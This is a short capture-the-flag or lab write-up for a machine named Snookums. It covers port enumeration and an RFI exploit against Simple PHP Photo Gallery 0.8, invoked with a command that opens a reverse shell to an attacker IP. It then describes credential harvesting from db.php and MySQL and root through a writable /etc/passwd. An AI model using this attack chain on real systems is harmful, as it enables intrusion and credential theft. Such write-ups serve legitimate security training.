# Snookums - Linux

## Enumeration

* nmap

```
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
```

* port 80 -> sinmple php photo gallery version 0.8 -> Vulnerable to RFI

* Exploit -> https://www.exploit-db.com/exploits/48424

```
python3 exp.py http://192.168.127.58 192.168.45.204 445
```

* Get shell as apache. Sql creds in db.php. 
* Get user hashes from mysql table. 
* Priv Esc -> writable /etc/passwd
